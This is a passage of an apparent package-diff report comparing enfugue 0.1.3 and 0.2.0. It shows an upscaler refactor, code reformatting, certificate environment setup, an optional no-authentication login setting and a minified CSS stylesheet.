                 if not getattr(self, "_informed_of_bad_controlled_unet", False):
                     logger.error(
                         "Incorrect use of UNet/ControlledUNet models. Controlnet input was detected, but only the non-controlled UNet is loaded. Controlnet input will be ignored going forward."
                     )
                     self._informed_of_bad_controlled_unet = True
             else:
```

### Comparing `enfugue-0.1.3/enfugue/diffusion/upscale/__init__.py` & `enfugue-0.2.0/enfugue/diffusion/support/upscale/upscaler.py`

 * *Files 12% similar despite different names*

```diff
@@ -1,36 +1,31 @@
 from __future__ import annotations
 
 import PIL
 
-from typing import Union
-
-from realesrgan import RealESRGANer
-from basicsr.archs.rrdbnet_arch import RRDBNet
+from typing import Union, TYPE_CHECKING
 
 from enfugue.util import check_download_to_dir
-from enfugue.diffusion.vision import ComputerVision
+from enfugue.diffusion.support.vision import ComputerVision
+from enfugue.diffusion.support.model import SupportModel
+
+if TYPE_CHECKING:
+    from realesrgan import RealESRGANer
 
 
-class Upscaler:
+class Upscaler(SupportModel):
     """
     The upscaler user ESRGAN or GFGPGAN for up to 4x upscale
     """
 
     GFPGAN_PATH = "https://github.com/TencentARC/GFPGAN/releases/download/v1.3.0/GFPGANv1.3.pth"
-    ESRGAN_PATH = (
-        "https://github.com/xinntao/Real-ESRGAN/releases/download/v0.1.0/RealESRGAN_x4plus.pth"
+    ESRGAN_PATH = "https://github.com/xinntao/Real-ESRGAN/releases/download/v0.1.0/RealESRGAN_x4plus.pth"
+    ESRGAN_ANIME_PATH = (
+        "https://github.com/xinntao/Real-ESRGAN/releases/download/v0.2.2.4/RealESRGAN_x4plus_anime_6B.pth"
     )
-    ESRGAN_ANIME_PATH = "https://github.com/xinntao/Real-ESRGAN/releases/download/v0.2.2.4/RealESRGAN_x4plus_anime_6B.pth"
-
-    def __init__(self, model_dir: str) -> None:
-        """
-        On initialization, pass the model dir.
-        """
-        self.model_dir = model_dir
 
     @property
     def esrgan_weights_path(self) -> str:
         """
         Gets the path to the ESRGAN model weights.
         """
         return check_download_to_dir(self.ESRGAN_PATH, self.model_dir)
@@ -45,88 +40,93 @@
     @property
     def gfpgan_weights_path(self) -> str:
         """
         Gets the path to the GFPGAN model weights.
         """
         return check_download_to_dir(self.GFPGAN_PATH, self.model_dir)
 
-    def get_upsampler(
-        self, tile: int = 0, tile_pad: int = 10, pre_pad: int = 10, anime: bool = False
-    ) -> RealESRGANer:
+    def get_upsampler(self, tile: int = 0, tile_pad: int = 10, pre_pad: int = 10, anime: bool = False) -> RealESRGANer:
         """
         Gets the appropriate upsampler
         """
+        import torch
+        from basicsr.archs.rrdbnet_arch import RRDBNet
+        from realesrgan import RealESRGANer
+
         if anime:
-            model = RRDBNet(
-                num_in_ch=3, num_out_ch=3, num_feat=64, num_block=6, num_grow_ch=32, scale=4
-            )
+            model = RRDBNet(num_in_ch=3, num_out_ch=3, num_feat=64, num_block=6, num_grow_ch=32, scale=4)
             model_path = self.esrgan_anime_weights_path
         else:
-            model = RRDBNet(
-                num_in_ch=3, num_out_ch=3, num_feat=64, num_block=23, num_grow_ch=32, scale=4
-            )
+            model = RRDBNet(num_in_ch=3, num_out_ch=3, num_feat=64, num_block=23, num_grow_ch=32, scale=4)
             model_path = self.esrgan_weights_path
 
         return RealESRGANer(
             scale=4,
             model_path=model_path,
             model=model,
             tile=tile,
             tile_pad=tile_pad,
             pre_pad=pre_pad,
-            half=True,
+            device=self.device,
+            half=self.dtype is torch.float16,
         )
 
     def esrgan(
         self,
         image: Union[str, PIL.Image.Image],
         outscale: int = 4,
         tile: int = 0,
         tile_pad: int = 10,
         pre_pad: int = 10,
         anime: bool = False,
     ) -> PIL.Image.Image:
         """
         Does a simple upscale
         """
-        if type(image) is str:
-            image = PIL.Image.open(image)
-
-        esrganer = self.get_upsampler(tile=tile, tile_pad=tile_pad, pre_pad=pre_pad, anime=anime)
-
-        return ComputerVision.revert_image(
-            esrganer.enhance(ComputerVision.convert_image(image), outscale=outscale)[0]
-        )
+        with self.context():
+            if type(image) is str:
+                image = PIL.Image.open(image)
+
+            esrganer = self.get_upsampler(tile=tile, tile_pad=tile_pad, pre_pad=pre_pad, anime=anime)
+            result = ComputerVision.revert_image(
+                esrganer.enhance(ComputerVision.convert_image(image), outscale=outscale)[0]
+            )
+            del esrganer
+            return result
 
     def gfpgan(
         self,
         image: Union[str, PIL.Image.Image],
         outscale: int = 4,
         tile: int = 0,
         tile_pad: int = 10,
         pre_pad: int = 10,
     ) -> PIL.Image.Image:
         """
         Does an upscale with face enhancement
         """
-        if type(image) is str:
-            image = PIL.Image.open(image)
-
-        from enfugue.diffusion.upscale.gfpganer import GFPGANer  # type: ignore[attr-defined]
-
-        gfpganer = GFPGANer(
-            model_path=self.gfpgan_weights_path,
-            upscale=outscale,
-            arch="clean",
-            channel_multiplier=2,
-            bg_upsampler=self.get_upsampler(tile=tile, tile_pad=tile_pad, pre_pad=pre_pad),
-            rootpath=self.model_dir,
-        )
+        with self.context():
+            if type(image) is str:
+                image = PIL.Image.open(image)
+
+            from enfugue.diffusion.support.upscale.gfpganer import GFPGANer  # type: ignore[attr-defined]
+
+            gfpganer = GFPGANer(
+                model_path=self.gfpgan_weights_path,
+                upscale=outscale,
+                arch="clean",
+                channel_multiplier=2,
+                bg_upsampler=self.get_upsampler(tile=tile, tile_pad=tile_pad, pre_pad=pre_pad),
+                rootpath=self.model_dir,
+                device=self.device,
+            )
 
-        return ComputerVision.revert_image(
-            gfpganer.enhance(
-                ComputerVision.convert_image(image),
-                has_aligned=False,
-                only_center_face=False,
-                paste_back=True,
-            )[2]
-        )
+            result = ComputerVision.revert_image(
+                gfpganer.enhance(
+                    ComputerVision.convert_image(image),
+                    has_aligned=False,
+                    only_center_face=False,
+                    paste_back=True,
+                )[2]
+            )
+            del gfpganer
+            return result
```

### Comparing `enfugue-0.1.3/enfugue/diffusion/upscale/gfpganer.py` & `enfugue-0.2.0/enfugue/diffusion/support/upscale/gfpganer.py`

 * *Files 2% similar despite different names*

```diff
@@ -42,19 +42,15 @@
         device=None,
         rootpath=None,
     ):
         self.upscale = upscale
         self.bg_upsampler = bg_upsampler
 
         # initialize model
-        self.device = (
-            torch.device("cuda" if torch.cuda.is_available() else "cpu")
-            if device is None
-            else device
-        )
+        self.device = torch.device("cuda" if torch.cuda.is_available() else "cpu") if device is None else device
         # initialize the GFP-GAN
         if arch == "clean":
             self.gfpgan = GFPGANv1Clean(
                 out_size=512,
                 num_style_feat=512,
                 channel_multiplier=channel_multiplier,
                 decoder_load_path=None,
@@ -129,17 +125,15 @@
 
         if has_aligned:  # the inputs are already aligned
             img = cv2.resize(img, (512, 512))
             self.face_helper.cropped_faces = [img]
         else:
             self.face_helper.read_image(img)
             # get face landmarks for each face
-            self.face_helper.get_face_landmarks_5(
-                only_center_face=only_center_face, eye_dist_threshold=5
-            )
+            self.face_helper.get_face_landmarks_5(only_center_face=only_center_face, eye_dist_threshold=5)
             # eye_dist_threshold=5: skip faces whose eye distance is smaller than 5 pixels
             # TODO: even with eye_dist_threshold, it will still introduce wrong detections and restorations.
             # align and warp each face
             self.face_helper.align_warp_face()
 
         # face restoration
         for cropped_face in self.face_helper.cropped_faces:
```

### Comparing `enfugue-0.1.3/enfugue/diffusion/util.py` & `enfugue-0.2.0/enfugue/diffusion/util.py`

 * *Files 2% similar despite different names*

```diff
@@ -22,15 +22,16 @@
 
 def tensorrt_available() -> bool:
     """
     Returns true if TensorRT is available.
     """
     try:
         import tensorrt
-        tensorrt # silence importchecker
+
+        tensorrt  # silence importchecker
         return True
     except:
         return False
 
 
 def directml_available() -> bool:
     """
@@ -168,26 +169,22 @@
     def get_difference(theta0: torch.Tensor, theta1: torch.Tensor) -> torch.Tensor:
         """
         Simply gets the difference from two values.
         """
         return theta0 - theta1
 
     @staticmethod
-    def weighted_sum(
-        theta0: torch.Tensor, theta1: torch.Tensor, alpha: Union[int, float]
-    ) -> torch.Tensor:
+    def weighted_sum(theta0: torch.Tensor, theta1: torch.Tensor, alpha: Union[int, float]) -> torch.Tensor:
         """
         Returns the sum of θ0 and θ0 weighted by ɑ
         """
         return ((1 - alpha) * theta0) + (alpha * theta1)
 
     @staticmethod
-    def add_weighted_difference(
-        theta0: torch.Tensor, theta1: torch.Tensor, alpha: Union[int, float]
-    ) -> torch.Tensor:
+    def add_weighted_difference(theta0: torch.Tensor, theta1: torch.Tensor, alpha: Union[int, float]) -> torch.Tensor:
         """
         Adds a weighted difference back to the original value
         """
         return theta0 + (alpha * theta1)
 
     @staticmethod
     def get_state_dict_from_checkpoint(checkpoint: Dict) -> Dict:
@@ -195,18 +192,15 @@
         Reads the raw state dictionary and find the proper state dictionary.
         """
         state_dict = checkpoint.pop("state_dict", checkpoint)
         if "state_dict" in state_dict:
             del state_dict["state_dict"]  # Remove any sub-embedded state dicts
 
         transformed_dict = dict(
-            [
-                (ModelMerger.transform_checkpoint_key(key), value)
-                for key, value in state_dict.items()
-            ]
+            [(ModelMerger.transform_checkpoint_key(key), value) for key, value in state_dict.items()]
         )
         state_dict.clear()
         state_dict.update(transformed_dict)
         return state_dict
 
     @staticmethod
     def load_checkpoint(checkpoint_path: str) -> Dict:
@@ -244,20 +238,16 @@
         Runs the configured merger.
         """
         logger.debug(
             f"Executing model merger with interpolation '{self.interpolation}', primary model {self.primary_model}, secondary model {self.secondary_model}, tertiary model {self.tertiary_model}"
         )
 
         primary_state_dict = self.load_checkpoint(self.primary_model)
-        secondary_state_dict = (
-            None if not self.secondary_model else self.load_checkpoint(self.secondary_model)
-        )
-        tertiary_state_dict = (
-            None if not self.tertiary_model else self.load_checkpoint(self.tertiary_model)
-        )
+        secondary_state_dict = None if not self.secondary_model else self.load_checkpoint(self.secondary_model)
+        tertiary_state_dict = None if not self.tertiary_model else self.load_checkpoint(self.tertiary_model)
 
         theta_0 = primary_state_dict
         theta_1 = secondary_state_dict
 
         if self.interpolation == "add-difference":
             if theta_1 is None or tertiary_state_dict is None:
                 raise ValueError(f"{self.interpolation} requires three models.")
@@ -294,26 +284,22 @@
                     if a.shape[1] == 4 and b.shape[1] == 8:
                         raise RuntimeError(
                             "When merging an instruct-pix2pix model with a standard one, the primary model must be the instruct-pix2pix model."
                         )
 
                     if a.shape[1] == 8 and b.shape[1] == 4:
                         # Merging IP2P into Normal
-                        theta_0[key][:, 0:4, :, :] = interpolate(
-                            a[:, 0:4, :, :], b, self.multiplier
-                        )
+                        theta_0[key][:, 0:4, :, :] = interpolate(a[:, 0:4, :, :], b, self.multiplier)
                         result_is_instruct_pix2pix_model = True
                     else:
                         # Merging inpainting into Normal
                         assert (
                             a.shape[1] == 9 and b.shape[1] == 4
                         ), f"Bad dimensions for merged layer {key}: A={a.shape}, B={b.shape}"
-                        theta_0[key][:, 0:4, :, :] = interpolate(
-                            a[:, 0:4, :, :], b, self.multiplier
-                        )
+                        theta_0[key][:, 0:4, :, :] = interpolate(a[:, 0:4, :, :], b, self.multiplier)
                         result_is_inpainting_model = True
                 else:
                     theta_0[key] = interpolate(a, b, self.multiplier)
 
                 if self.half:
                     theta_0[key] = self.as_half(theta_0[key])
```

### Comparing `enfugue-0.1.3/enfugue/enfugue.py` & `enfugue-0.2.0/enfugue/enfugue.py`

 * *Files 17% similar despite different names*

```diff
@@ -4,17 +4,20 @@
 if __name__ == "__main__":
     import multiprocessing
 
     multiprocessing.freeze_support()  # pyinstaller fix
 
     from enfugue.util import get_local_configuration
     import os
+    import certifi
     import platform
 
     os.environ["CUDA_MODULE_LOADING"] = "LAZY"
+    os.environ["REQUESTS_CA_BUNDLE"] = certifi.where()
+    os.environ["SSL_CERT_FILE"] = certifi.where()
 
     from enfugue.server import EnfugueServer
     from enfugue.util.browser import OpenBrowserWhenResponsiveThread
     from typing import Optional
 
     system = platform.system()
     configuration = get_local_configuration()
```

### Comparing `enfugue-0.1.3/enfugue/interface/__init__.py` & `enfugue-0.2.0/enfugue/interface/__init__.py`

 * *Files 2% similar despite different names*

```diff
@@ -51,17 +51,15 @@
     def configure(self, **configuration: Any) -> None:
         """
         Intercept configure() to add the static directory.
         """
         production_root = get_local_static_directory()
         production_templates = os.path.join(production_root, "html")
 
-        development_root = os.path.abspath(
-            os.path.join(os.path.dirname(enfugue.__file__), "../../../src")
-        )
+        development_root = os.path.abspath(os.path.join(os.path.dirname(enfugue.__file__), "../../../src"))
         development_templates = os.path.join(development_root, "html")
 
         static_dirs = [production_root]
         template_dirs = []
 
         if os.path.exists(development_root):
             static_dirs.append(development_root)
@@ -162,17 +160,15 @@
                         self.configuration["server.cms.path.root"],
                         self.configuration["server.cms.context.base.android.icon.href"],
                     ),
                     "sizes": self.configuration["server.cms.context.base.android.icon.size"],
                     "type": self.configuration["server.cms.context.base.android.icon.type"],
                 }
             ],
-            "theme_color": self.configuration.get(
-                "server.cms.context.base.meta.theme-color", "#ffffff"
-            ),
+            "theme_color": self.configuration.get("server.cms.context.base.meta.theme-color", "#ffffff"),
             "background_color": "#000000" if contrast_color(app_color) == "black" else "#ffffff",
             "display": "standalone",
         }
 
     @handlers.bypass(
         SessionExtensionServerBase,
         UserExtensionTemplateServer,
@@ -190,17 +186,15 @@
         app_color = self.configuration.get("server.cms.context.base.meta.theme-color", "#ffffff")
         response.content_type = "application/xml"
         response.body = ET.tostring(
             E.browserconfig(
                 E.msapplication(
                     E.tile(
                         E(
-                            "square{0}logo".format(
-                                self.configuration["server.cms.context.base.windows.icon.size"]
-                            ),
+                            "square{0}logo".format(self.configuration["server.cms.context.base.windows.icon.size"]),
                             src=url_join(
                                 self.configuration["server.cms.path.root"],
                                 self.configuration["server.cms.context.base.windows.icon.href"],
                             ),
                         ),
                         E.TileColor(app_color),
                     )
@@ -242,26 +236,22 @@
         ORMMiddlewareBase,
     )  # Bypass token checking and ORM instantiation
     @handlers.reverse("static", "/static/{path}")
     @handlers.methods("GET")
     @handlers.path("/static/(?P<path>\S+)")
     @handlers.cache()
     @handlers.download()
-    def static(
-        self, request: Request, response: Response, path: str
-    ) -> Union[str, io.BytesIO, io.BufferedReader]:
+    def static(self, request: Request, response: Response, path: str) -> Union[str, io.BytesIO, io.BufferedReader]:
         directories = self.configuration.get("server.static.directories", [])
         if path.endswith("/index.autogenerated.mjs"):
             # Create autogenerated file index for JS directories.
             for root in directories:
                 dir_path = os.path.dirname(os.path.join(root, path))
                 if os.path.exists(dir_path) and os.path.isdir(dir_path):
-                    js_files = [
-                        filename for filename in os.listdir(dir_path) if filename.endswith("js")
-                    ]
+                    js_files = [filename for filename in os.listdir(dir_path) if filename.endswith("js")]
                     if len(js_files) > 0:
                         index = "const Index = {0}; export {{ Index }};".format(
                             Serializer.serialize(list(sorted(js_files)))
                         )
                         response.content_type = "application/javascript"
                         return io.BytesIO(index.encode("utf-8"))
             raise NotFoundError(f"No javascript files found at path {path[:-23]}")
@@ -294,14 +284,18 @@
     @handlers.template("content-login.html.j2")
     @handlers.methods("GET")
     @handlers.path("^/login$")
     def view_login(self, request: Request, response: Response) -> Dict[str, Any]:
         """
         The GET() handler for logging in, i.e, the landing page when a user isn't logged in.
         """
+        if self.configuration.get("enfugue.noauth", False):
+            if not hasattr(request, "token"):
+                self.bypass_login(request, response)
+            self.redirect(response, "/", 302)
         return {"title": "Login"}
 
     @handlers.methods("POST")
     @handlers.template("content-login.html.j2")
     @handlers.path("^/login$")
     @handlers.reverse("Login", "/login")
     def process_login(self, request, response) -> Dict[str, Any]:
```

### Comparing `enfugue-0.1.3/enfugue/interface/helpers.py` & `enfugue-0.2.0/enfugue/interface/helpers.py`

 * *Files 5% similar despite different names*

```diff
@@ -19,17 +19,15 @@
 def check_url(configuration: APIConfiguration, value: Any) -> Any:
     """
     For configuration values that start with '/', prepend the CMS root.
     For configuration values that start with '/static', prepend the static root.
     """
     if isinstance(value, str) and value.startswith("/"):
         if value.startswith("/static/"):
-            static_path = str(
-                configuration.get("server.cms.path.static", configuration["server.cms.path.root"])
-            )
+            static_path = str(configuration.get("server.cms.path.static", configuration["server.cms.path.root"]))
             if static_path.endswith("static") or static_path.endswith("static/"):
                 value = value[len("/static") :]
             return url_join(static_path, value)
         else:
             return url_join(str(configuration["server.cms.path.root"]), decode(value))
     return value
 
@@ -50,23 +48,19 @@
     'src="http://www.example.com/static/img.jpg"'
     """
 
     name = "html_properties"
 
     def __call__(self, property_dict: dict) -> str:
         for property_name in property_dict:
-            property_dict[property_name] = check_url(
-                self.getConfiguration(), property_dict[property_name]
-            )
+            property_dict[property_name] = check_url(self.getConfiguration(), property_dict[property_name])
 
         return " ".join(
             [
-                '{0}="{1}"'.format(key, property_dict[key])
-                if property_dict[key] is not None
-                else key
+                '{0}="{1}"'.format(key, property_dict[key]) if property_dict[key] is not None else key
                 for key in property_dict
             ]
         )
 
 
 class SerializeHelperFunction(FunctionExtensionBase):
     """
```

### Comparing `enfugue-0.1.3/enfugue/partner/civitai.py` & `enfugue-0.2.0/enfugue/partner/civitai.py`

 * *Files 2% similar despite different names*

```diff
@@ -31,17 +31,15 @@
     def __init__(self, **properties: Any) -> None:
         """
         On initialization, clean description.
         """
         self.properties = properties
         if self.properties.get("description", None) is not None:
             lines = self.html_parser.handle(self.properties["description"]).splitlines()
-            self.properties["description"] = "\n".join(
-                [line.strip() for line in lines if line.strip()]
-            )
+            self.properties["description"] = "\n".join([line.strip() for line in lines if line.strip()])
 
     def serialize(self) -> Dict[str, Any]:
         """
         When serializing just return the properties dict.
         """
         return self.properties
 
@@ -63,24 +61,20 @@
         if client is None:
             client = {}
         client["secure"] = True
         client["host"] = "civitai.com"
         client["path"] = "/api/v1"
         super(CivitAI, self).configure(client=client, **kwargs)
 
-    def get_all(
-        self, path: str, limit: Optional[int] = None, **parameters: Any
-    ) -> Iterator[Dict[str, Any]]:
+    def get_all(self, path: str, limit: Optional[int] = None, **parameters: Any) -> Iterator[Dict[str, Any]]:
         """
         Gets all results from an endpoint, paginating if necessary
         """
 
-        parameters = dict(
-            [(key, value) for key, value in parameters.items() if value is not None and value != ""]
-        )
+        parameters = dict([(key, value) for key, value in parameters.items() if value is not None and value != ""])
 
         if limit is not None:
             parameters["limit"] = min(limit, self.PAGE_SIZE)
 
         # Get first page
         page = self.get(path, parameters=parameters).json()
         total_items = 0
```

### Comparing `enfugue-0.1.3/enfugue/server.py` & `enfugue-0.2.0/enfugue/server.py`

 * *Files identical despite different names*

### Comparing `enfugue-0.1.3/enfugue/static/css/01-reset.min.css` & `enfugue-0.2.0/enfugue/static/css/01-reset.min.css`

 * *Files identical despite different names*

### Comparing `enfugue-0.1.3/enfugue/static/css/04-base.min.css` & `enfugue-0.2.0/enfugue/static/css/04-base.min.css`

 * *Files 1% similar despite different names*

```diff
@@ -1 +1 @@
-:not(i),:not(i):after,:not(i):before{box-sizing:border-box}*{scrollbar-color:rgba(0,0,0,.25),transparent;scrollbar-width:thin}::-webkit-scrollbar{background:var(--darkest-color);height:14px;width:14px}::-webkit-scrollbar-thumb{background-clip:padding-box;background-color:hsla(0,0%,100%,.25);border:4px solid hsla(0,0%,100%,0);border-radius:7px;box-shadow:inset -1px -1px 0 rgba(0,0,0,.05),inset 1px 1px 0 rgba(0,0,0,.05);height:6px}::-webkit-scrollbar-thumb:hover{background-color:hsla(0,0%,100%,.35)}::-webkit-scrollbar-button{display:none;height:0;width:0}::-webkit-scrollbar-corner{background:var(--darkest-color)}body,html{font-family:var(--body-font),sans-serif;font-size:14px;font-weight:400;height:100%;width:100%}body{align-items:stretch;background-color:var(--darkest-color);display:flex;flex-flow:column nowrap;justify-content:stretch;position:relative}header{flex-grow:0;overflow:visible;z-index:5}header,main{box-sizing:border-box;flex-shrink:0;position:relative;width:100%}main{background-position:50%;background-size:cover;flex-grow:1;overflow:auto}footer{align-items:center;background-color:var(--darker-color);box-sizing:border-box;color:var(--lighter-color);display:flex;flex-flow:column nowrap;flex-grow:0;flex-shrink:0;font-size:8px;gap:4px;justify-content:center;padding:5px 0;position:relative;text-align:center;width:100%}.light-background{background-color:var(--lightest-color)}.semi-strong{font-weight:500}.strong,strong{font-weight:700}.black{font-weight:800}.ultra-black{font-weight:900}.half{margin:0 auto;width:50%}.em,em{font-style:italic}em.note{font-size:.75em;margin-top:2px}h1,h2,h3,h4,h5{font-family:var(--header-font),var(--body-font),sans-serif}h1{border-bottom:4px solid var(--theme-color-secondary);font-size:3rem;font-weight:700;line-height:1em;margin:0 0 1em;text-transform:uppercase}h1,h2{color:var(--theme-color-secondary)}h2{font-size:2rem}h2,h3{font-weight:500}h3{font-size:1.5rem;text-align:center}code,pre{font-family:var(--monospace-font),monospace;font-size:12px}.note{color:var(--theme-color-primary);font-size:.8em}fieldset,form{align-items:stretch;display:flex;gap:1em;justify-content:stretch;position:relative}form{flex-flow:column nowrap;padding:1em 1em 0}fieldset{flex-flow:row wrap}fieldset legend{align-items:center;border-bottom:2px solid var(--theme-color-tertiary);color:var(--theme-color-tertiary);display:flex;flex-flow:row nowrap;font-family:var(--header-font),sans-serif;font-size:16px;font-weight:700;justify-content:space-between;margin:0 0 .5em;padding:0 0 3px;width:100%}fieldset .field-container{align-items:stretch;display:flex;flex-basis:100px;flex-flow:column-reverse nowrap;flex-grow:1}fieldset.collapsed .field-container{display:none}fieldset.collapsible legend{cursor:pointer}fieldset.collapsible legend:after{border-bottom:7px solid transparent;border-right:7px solid var(--theme-color-tertiary);border-top:7px solid transparent;content:"\A";display:inline-block;height:0;transform:rotate(-90deg);transform-origin:center;transition:all .25s ease-in-out;width:0}fieldset.collapsed legend:after{transform:rotate(0deg)}fieldset .field-container goodydata-color-input,fieldset .field-container goodydata-search-list,fieldset .field-container input,fieldset .field-container select,fieldset .field-container textarea{flex-grow:1;margin:0;width:100%}fieldset .field-container.hidden-input-view{display:none}form label{color:var(--theme-color-secondary);display:inline-block;flex-grow:0;font-family:var(--header-font),sans-serif;font-size:14px;font-weight:400;margin-bottom:.25em;min-height:12px}form label.required:after{content:"*"}form .submit-buttons{align-items:stretch;display:flex;flex-flow:row nowrap;gap:1em;justify-content:stretch;margin-top:1em;position:relative}form .submit-buttons>*{flex-basis:100%}form input.cancel{background-color:var(--dark-color);border-color:var(--dark-color)}form input.cancel:not(:disabled):not(.disabled):hover{background-color:transparent;color:#fff}form .error{color:tomato}form p.error:not(:empty){margin:0 0 .5em}form>p.error:not(:empty){margin:1em 0 0}form.inline-form{padding:1em}form.inline-form,form.inline-form fieldset{border:none;flex-basis:100%;flex-flow:row nowrap}form.inline-form input[type=submit]{margin:0}form.inline-form fieldset.field-set-flags{flex-basis:30%;flex-grow:0;flex-shrink:0}form.inline-form fieldset legend{display:none}form.inline-form fieldset .field-container{flex-basis:100%;margin-right:4px}form.inline-form fieldset .field-container:not(.checkbox-input-view) label{display:none}form.embedded-form{background-color:rgba(0,0,0,.01);border:1px solid rgba(0,0,0,.2);margin:.5em;padding:1em}.field-container.checkbox-input-view{align-items:center;background-color:var(--theme-color-primary);border-radius:5px;cursor:pointer;display:flex;flex-flow:row nowrap;padding:0 10px;position:relative;transition:background-color .25s ease-in-out}.field-container.checkbox-input-view label{padding:1em 0}.field-container.checkbox-input-view:after{background-color:var(--lightest-color);bottom:0;left:0;opacity:0;pointer-events:none;position:absolute;right:0;top:0;transition:opacity .25s ease-in-out}.field-container.checkbox-input-view:hover:after{opacity:.1}.field-container.checkbox-input-view label{color:var(--lightest-color);cursor:pointer;display:block;flex-grow:1;margin-top:2.5px}.field-container.checkbox-input-view input{flex-grow:0;flex-shrink:0;height:15px;margin-right:5px;width:15px}form.inline-form fieldset .field-container input:not([type=checkbox]),form.inline-form fieldset .field-container select,form.inline-form fieldset .field-container textarea{margin:0}form.inline-form.show-legend{margin-top:.5em}form.inline-form.show-legend fieldset{align-items:center}form.inline-form.show-legend fieldset legend{display:block;position:absolute;top:-25px;width:calc(100% - 5px)}form.inset-form{background-color:var(--theme-color-secondary);border-radius:5px;margin:1em}form.inset-form fieldset legend{border-color:var(--lightest-color);color:var(--lightest-color)}@keyframes loadingBar{0%{left:1em;right:calc(100% - 2em)}50%{left:1em;right:1em}to{left:calc(100% - 2em);right:1em}}@keyframes loadingBarFull{0%{left:0;right:100%}50%{left:0;right:0}to{left:100%;right:0}}.loading-bar{position:relative}.loading-bar:after,form:after{animation-direction:alternate;animation-duration:.75s;animation-iteration-count:infinite;animation-name:loadingBar;animation-timing-function:ease-in-out;background-color:var(--theme-color-primary);border-radius:10px;bottom:0;content:"\A";height:7px;opacity:0;position:absolute;transition:opacity .15s ease-in-out}.loading-bar.loading:after,form.loading:after{opacity:1}a{color:var(--theme-color-primary);cursor:pointer;text-decoration:underline;transition:color .25s ease-in-out}a:hover{color:var(--theme-color-secondary)}input,select,textarea{background-color:var(--darker-color);border:1px solid #000;border-radius:5px;box-sizing:border-box;color:#fff;margin:0 0 1em;outline:none;padding:10px 15px;transition:all .25s ease-in-out}input,option,select,textarea{font-family:var(--body-font),sans-serif}input{padding:11px 15px}input.search{margin:1em;width:calc(100% - 2em)}input[type=file]{background-image:linear-gradient(to right,var(--theme-color-primary),var(--theme-color-primary));background-position:0;background-repeat:no-repeat;background-size:0 100%}input:disabled,select:disabled,textarea:disabled{color:var(--dark-color)}.button,button,input[type=button],input[type=submit]{background-color:var(--theme-color-primary);border:2px solid var(--theme-color-primary);box-sizing:border-box;color:var(--lightest-color);cursor:pointer;display:inline-block;font-family:var(--header-font),sans-serif;font-size:14px;font-weight:700;padding:.75rem 1.5rem;text-align:center;text-decoration:none;text-transform:uppercase;transition:color .25s ease-in-out,background-color .25s ease-in-out}.border-button,button.border-button,input[type=button].border-button,input[type=submit].border-button{background-color:transparent;border:2px solid var(--theme-color-primary);border-radius:2px;box-sizing:border-box;color:#444;cursor:pointer;display:inline-block;padding:.5em;text-align:center;text-decoration:none;transition:color .25s ease-in-out,border-color .25s ease-in-out}.button.disabled,.button:disabled,button.disabled,button:disabled,input[type=button].disabled,input[type=button]:disabled,input[type=submit].disabled,input[type=submit]:disabled{background-color:var(--darker-color);border-color:var(--dark-color);color:var(--dark-color);cursor:default}.border-button.disabled,.border-button:disabled,button.border-button.disabled,button.border-button:disabled,input[type=button].border-button.disabled,input[type=button].border-button:disabled,input[type=submit].border-button.disabled,input[type=submit].border-button:disabled{cursor:default;opacity:.5}.border-button.active,button.border-button.active,input[type=button].border-button.active,input[type=submit].border-button.active{border-color:var(--theme-color-primary);color:var(--theme-color-primary);cursor:default;opacity:1}.button:not(:disabled):not(.disabled):hover,button:not(:disabled):not(.disabled):hover,input[type=button]:not(:disabled):not(.disabled):hover,input[type=submit]:not(:disabled):not(.disabled):hover{background-color:transparent;color:var(--theme-color-primary)}.border-button:not(:disabled):not(.disabled):hover,button.border-button:not(:disabled):not(.disabled):hover,input[type=button].border-button:not(:disabled):not(.disabled):hover,input[type=submit].border-button:not(:disabled):not(.disabled):hover{border-color:var(--theme-color-primary);color:var(--theme-color-primary)}form ul.list-input-view{display:flex;flex-flow:row wrap;gap:6px}form ul.list-input-view li{background-color:transparent;border:2px solid var(--theme-color-primary);border-radius:5px;color:var(--theme-color-primary);cursor:pointer;font-size:12px;font-weight:700;overflow:hidden;padding:8px 14px;transition:color .25s ease-in-out,background-color .25s ease-in-out}form ul.list-input-view li.selected{background-color:var(--theme-color-primary);color:var(--lightest-color)}.loader{position:relative}.loader:after{backdrop-filter:blur(2px);background-position:50%;background-repeat:no-repeat;background-size:250px auto;bottom:0;content:"\A";left:0;opacity:0;pointer-events:none;position:absolute;right:0;top:0;transition:opacity .4s ease-out;z-index:100}.loader.loader-cover:after{background-color:var(--lightest-color)}.loader.loading:after{opacity:1;pointer-events:auto}.loader.loader-scaled:after{background-size:75% auto}.loader.button:after{animation-direction:alternate;animation-duration:.75s;animation-iteration-count:infinite;animation-name:loadingBarFull;animation-timing-function:ease-in-out;background-color:var(--theme-color-tertiary);background-image:none;z-index:-1}.loader.button.loading{background:none;cursor:not-allowed}.shadowbox-container{align-items:center;backdrop-filter:blur(5px);background-color:rgba(0,0,0,.8);bottom:0;display:flex;flex-flow:row nowrap;justify-content:center;left:0;opacity:0;pointer-events:none;position:fixed;right:0;top:0;transition:opacity .5s ease-in-out;z-index:5}.shadowbox-container.active{opacity:1;pointer-events:auto}.shadowbox-container .box-container{background-color:#fff;padding:20px;width:calc(100% - 40px);z-index:6}.shadowbox-container .box-container a.close-shadowbox{color:#0146ad;cursor:pointer;display:block;font-size:30px;font-weight:900;margin-right:-5px;margin-top:-21px;padding-right:10px;text-align:right;text-decoration:none;z-index:7}.shadowbox-container iframe{border:none;outline:none;z-index:7}.tooltip-container{background-color:var(--darker-color);border:1px solid var(--light-color);border-radius:5px;color:var(--light-color);font-weight:300;max-width:75vw;opacity:0;padding:10px;pointer-events:none;position:fixed;transition:opacity .25s ease-in-out;white-space:break-spaces;z-index:99}.tooltip-container.active{opacity:1}.tooltip-container>p:not(:last-child){margin-bottom:1em}.notification-container{align-items:center;display:flex;flex-flow:row nowrap;justify-content:center;opacity:1;padding:5px;pointer-events:none;position:fixed;top:0;transition:opacity .5s ease-in-out;width:100%;z-index:6}.notification-container .notification{background-color:var(--darker-color);border:1px solid var(--light-color);border-radius:5px;color:var(--light-color);font-size:12px;font-weight:600;padding:10px}@keyframes slide-background{0%{background-position:0 0}to{background-position:100vw 0}}.sliding-gradient{animation-delay:0s;animation-duration:10s;animation-iteration-count:infinite;animation-name:slide-background;animation-timing-function:linear;background:linear-gradient(to right,var(--theme-color-primary),var(--theme-color-secondary),var(--theme-color-tertiary),var(--theme-color-primary));background-size:100vw 100%}@media (max-width:1024px){h1{font-size:3rem}h2{font-size:2rem}h3{font-size:1.5rem}}@media (max-width:768px){h1{font-size:2.5rem}}
